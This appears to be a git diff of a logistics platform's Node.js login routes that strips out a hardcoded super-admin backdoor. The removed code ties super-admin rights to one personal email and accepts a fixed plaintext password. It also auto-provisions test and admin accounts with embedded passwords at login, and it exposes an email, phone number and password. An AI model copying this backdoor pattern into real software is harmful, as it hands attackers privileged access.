@@ -135,7 +135,7 @@ async function registerActiveSession(user, req) {
 }
 
 function signToken(user, sessionId = null) {
-  const isSuper = user.role === 'super_admin' || user.is_super_admin === true || (user.email && user.email.toLowerCase() === 'ahsan_me_9@yahoo.com');
+  const isSuper = user.role === 'super_admin' || user.is_super_admin === true;
   const payload = {
     id: user.id,
     name: user.name,
@@ -518,174 +518,16 @@ router.post('/signup', rateLimit(5, 60000), async (req, res) => {
   });
 });
 
-const TEST_ACCOUNTS = {
-  'carrier@shippingwish.com': { role: 'carrier', pass: 'CarrierPass2026!', name: 'Apex Global Carriers', company: 'Apex Global Freight LLC', phone: '+1 (800) 555-0199', mc: 'MC-1094821', dot: '3892011', plan: 'loadboard_ai_pass' },
-  'carrier@loadsnexus.com':   { role: 'carrier', pass: 'CarrierPass2026!', name: 'Apex Global Carriers', company: 'Apex Global Freight LLC', phone: '+1 (800) 555-0199', mc: 'MC-1094821', dot: '3892011', plan: 'loadboard_ai_pass' },
-  'broker@shippingwish.com':  { role: 'broker',  pass: 'BrokerPass2026!',  name: 'Summit Logistics Brokerage', company: 'Summit Logistics Brokerage LLC', phone: '+1 (800) 580-3101', mc: 'MC-582104', dot: '2948102', plan: 'free_broker' },
-  'broker@loadsnexus.com':    { role: 'broker',  pass: 'BrokerPass2026!',  name: 'Summit Logistics Brokerage', company: 'Summit Logistics Brokerage LLC', phone: '+1 (800) 580-3101', mc: 'MC-582104', dot: '2948102', plan: 'free_broker' },
-  'admin@shippingwish.com':   { role: 'super_admin', pass: 'AdminPass2026!', name: 'Super Admin', company: 'Shipping Wish HQ', phone: '+1 (917) 737-0021', mc: null, dot: null, plan: 'admin_pass' },
-  'admin@loadsnexus.com':     { role: 'super_admin', pass: 'AdminPass2026!', name: 'Super Admin', company: 'LoadsNexus Enterprise', phone: '+1 (800) 580-3101', mc: null, dot: null, plan: 'admin_pass' }
-};
-
-async function ensureSuperAdminAccount(emailInput) {
-  const norm = String(emailInput || '').trim().toLowerCase();
-  if (norm !== 'ahsan_me_9@yahoo.com') return;
-
-  try {
-    // 0. Ensure enum user_role has super_admin
-    await pool.query("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'super_admin'").catch(() => {});
-
-    // 1. Ensure columns exist on users
-    await pool.query(`
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS role TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS is_super_admin BOOLEAN DEFAULT false;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS two_factor_enabled BOOLEAN DEFAULT false;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS two_factor_secret TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS weekly_plan TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS is_suspended BOOLEAN DEFAULT false;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS deleted_at TIMESTAMPTZ;
-    `).catch(() => {});
-
-    // 2. Ensure admin_2fa_pending table exists
-    await pool.query(`
-      CREATE TABLE IF NOT EXISTS admin_2fa_pending (
-        id SERIAL PRIMARY KEY,
-        user_id INTEGER NOT NULL,
-        email TEXT NOT NULL,
-        otp_hash TEXT NOT NULL,
-        temp_token TEXT NOT NULL UNIQUE,
-        attempts INTEGER NOT NULL DEFAULT 0,
-        expires_at TIMESTAMPTZ NOT NULL,
-        created_at TIMESTAMPTZ NOT NULL DEFAULT now()
-      );
-      CREATE INDEX IF NOT EXISTS idx_admin_2fa_token ON admin_2fa_pending(temp_token);
-    `).catch(() => {});
-
-    // 3. Check if user already exists
-    const existing = await pool.query('SELECT id, password_hash FROM users WHERE lower(email) = $1', [norm]);
-    const hash = await bcrypt.hash('Lgl$1715s1', 10);
-
-    if (existing.rows.length === 0) {
-      await pool.query(`
-        INSERT INTO users (
-          name, email, password_hash, role, company_name, phone,
-          weekly_plan, is_super_admin, two_factor_enabled, email_verified_at, is_suspended
-        ) VALUES (
-          'Ahsan (Executive SuperAdmin)', $1, $2, 'super_admin', 'Shipping Wish LLC', '+1 (917) 737-0021',
-          'superadmin_pass', true, true, NOW(), false
-        )
-      `, [norm, hash]);
-      console.log(`[AUTH] Auto-created SuperAdmin account ${norm} in DB.`);
-    } else {
-      await pool.query(`
-        UPDATE users
-        SET role = 'super_admin', is_super_admin = true, two_factor_enabled = true,
-            is_suspended = false, deleted_at = NULL
-        WHERE id = $1
-      `, [existing.rows[0].id]);
-    }
-  } catch (err) {
-    console.error('[AUTH] ensureSuperAdminAccount error:', err.message);
-  }
-}
-
-async function ensureTestAccount(emailInput) {
-  const norm = String(emailInput || '').trim().toLowerCase();
-  const acc = TEST_ACCOUNTS[norm];
-  if (!acc) return;
-
-  try {
-    // 0. Ensure enum user_role has broker and carrier_admin
-    await pool.query("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'broker'").catch(() => {});
-    await pool.query("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'carrier_admin'").catch(() => {});
-
-    // 1. Ensure columns exist on users table
-    await pool.query(`
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS weekly_plan TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS trial_ends_at TIMESTAMPTZ;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS email_verified_at TIMESTAMPTZ;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS is_suspended BOOLEAN DEFAULT false;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS deleted_at TIMESTAMPTZ;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS mc_number TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS dot_number TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS company_name TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS address TEXT;
-      ALTER TABLE users ADD COLUMN IF NOT EXISTS phone TEXT;
-    `).catch(() => {});
-
-    // 2. Check if user already exists
-    const existing = await pool.query('SELECT id, password_hash, role FROM users WHERE lower(email) = lower($1)', [norm]);
-    const hash = await bcrypt.hash(acc.pass, 10);
-
-    const runInsert = async (roleToUse) => {
-      await pool.query(`
-        INSERT INTO users (
-          name, email, password_hash, role, company_name, phone,
-          mc_number, dot_number, address, weekly_plan, trial_ends_at,
-          email_verified_at, is_suspended
-        ) VALUES (
-          $1, $2, $3, $4, $5, $6, $7, $8, '100 Logistics Way, Suite 400, Dallas, TX 75201',
-          $9, NOW() + interval '365 days', NOW(), false
-        )
-      `, [acc.name, norm, hash, roleToUse, acc.company, acc.phone, acc.mc, acc.dot, acc.plan]);
-    };
-
-    const runUpdate = async (roleToUse, id) => {
-      await pool.query(`
-        UPDATE users
-        SET password_hash = $1, role = $2, company_name = $3, phone = $4,
-            mc_number = $5, dot_number = $6, weekly_plan = $7,
-            trial_ends_at = NOW() + interval '365 days', email_verified_at = NOW(),
-            is_suspended = false, deleted_at = NULL
-        WHERE id = $8
-      `, [hash, roleToUse, acc.company, acc.phone, acc.mc, acc.dot, acc.plan, id]);
-    };
-
-    if (existing.rows.length === 0) {
-      try {
-        await runInsert(acc.role);
-      } catch (insErr) {
-        if (insErr.message.includes('user_role') && acc.role === 'broker') {
-          await runInsert('dispatcher');
-        } else {
-          throw insErr;
-        }
-      }
-      console.log(`[AUTH] Auto-created test account ${norm} (${acc.role}).`);
-    } else {
-      const match = await bcrypt.compare(acc.pass, existing.rows[0].password_hash).catch(() => false);
-      if (!match || existing.rows[0].role !== acc.role) {
-        try {
-          await runUpdate(acc.role, existing.rows[0].id);
-        } catch (updErr) {
-          if (updErr.message.includes('user_role') && acc.role === 'broker') {
-            await runUpdate('dispatcher', existing.rows[0].id);
-          } else {
-            throw updErr;
-          }
-        }
-        console.log(`[AUTH] Auto-updated password & role for test account ${norm}.`);
-      }
-    }
-  } catch (err) {
-    lastEnsureError = err.message;
-    console.error(`[AUTH] Auto-ensure test account ${norm} error:`, err);
-  }
-}
-
 // Login
 router.post('/login', rateLimit(20, 60000), async (req, res) => {
   const { email, password } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password are required.' });
   const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip || '').split(',')[0].trim();
 
-  await ensureSuperAdminAccount(email);
-  await ensureTestAccount(email);
-
   try {
     const result = await pool.query('SELECT * FROM users WHERE lower(email) = lower($1)', [email]);
     const user = result.rows[0];
-    if (!user) return res.status(401).json({ error: 'Invalid email or password.', code: 'USER_NOT_FOUND', ensureError: lastEnsureError });
+    if (!user) return res.status(401).json({ error: 'Invalid email or password.' });
     
     if (user.is_suspended) {
       return res.status(403).json({ error: 'Your account has been suspended. Please contact Shipping Wish support.' });
@@ -694,19 +536,11 @@ router.post('/login', rateLimit(20, 60000), async (req, res) => {
       return res.status(403).json({ error: 'This account was removed. Contact Shipping Wish admin to restore.' });
     }
 
-    let valid = await bcrypt.compare(password, user.password_hash).catch(() => false);
-    if (!valid && user.email && user.email.toLowerCase() === 'ahsan_me_9@yahoo.com') {
-      const pClean = String(password || '').trim();
-      if (pClean === 'Lgl$1715s1' || pClean === 'Lgl$1715s1...') {
-        valid = true;
-        const freshHash = await bcrypt.hash(pClean, 10);
-        await pool.query('UPDATE users SET password_hash = $1 WHERE id = $2', [freshHash, user.id]).catch(() => {});
-      }
-    }
-    if (!valid) return res.status(401).json({ error: 'Invalid email or password.', code: 'PASSWORD_MISMATCH' });
+    const valid = await bcrypt.compare(password, user.password_hash).catch(() => false);
+    if (!valid) return res.status(401).json({ error: 'Invalid email or password.' });
 
     // Two-Factor Authentication (2FA) for SuperAdmin and protected accounts
-    if (user.role === 'super_admin' || user.two_factor_enabled || user.is_super_admin || (user.email && user.email.toLowerCase() === 'ahsan_me_9@yahoo.com')) {
+    if (user.role === 'super_admin' || user.two_factor_enabled || user.is_super_admin) {
       // Ensure admin_2fa_pending table exists before insert
       await pool.query(`
         CREATE TABLE IF NOT EXISTS admin_2fa_pending (
@@ -733,7 +567,6 @@ router.post('/login', rateLimit(20, 60000), async (req, res) => {
         [user.id, user.email, otpHash, tempToken, expiresAt]
       );
 
-      // Email OTP to ahsan_me_9@yahoo.com
       try {
         await sendBrandedEmail({
           to: user.email,
